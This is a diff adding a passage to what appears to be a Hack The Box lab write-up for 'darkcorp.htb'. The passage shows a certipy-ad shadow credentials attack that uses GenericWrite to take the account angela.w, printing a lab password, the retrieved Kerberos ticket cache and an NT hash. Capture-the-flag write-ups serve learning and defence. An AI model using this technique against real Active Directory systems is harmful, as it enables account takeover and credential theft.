@@ -1191,7 +1191,36 @@ My current user has GenericWrite on this user!
 
 So its either a targeted kerberoast or shadow credentials
 
+```python
+certipy-ad shadow auto -u 'john.w@darkcorp.htb' -p 'Pack_Beneath_Solid9!' -account 'angela.w' -dc-host dc-01.darkcorp.htb -dc-ip 172.16.20.1 -ldap-scheme ldap
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
+[*] Targeting user 'angela.w'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '1e2b25402f2d44cf8f1911fdaf14a010'
+[*] Adding Key Credential with device ID '1e2b25402f2d44cf8f1911fdaf14a010' to the Key Credentials for 'angela.w'
+[*] Successfully added Key Credential with device ID '1e2b25402f2d44cf8f1911fdaf14a010' to the Key Credentials for 'angela.w'
+[*] Authenticating as 'angela.w' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'angela.w@darkcorp.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'angela.w.ccache'
+[*] Wrote credential cache to 'angela.w.ccache'
+[*] Trying to retrieve NT hash for 'angela.w'
+[*] Restoring the old Key Credentials for 'angela.w'
+[*] Successfully restored the old Key Credentials for 'angela.w'
+[*] NT hash for 'angela.w': 957246c8137069bca672dc6aa0af7c7a
+```
+
+Ill apply shadow credentials
+
+```python
+
+```
 
 
 
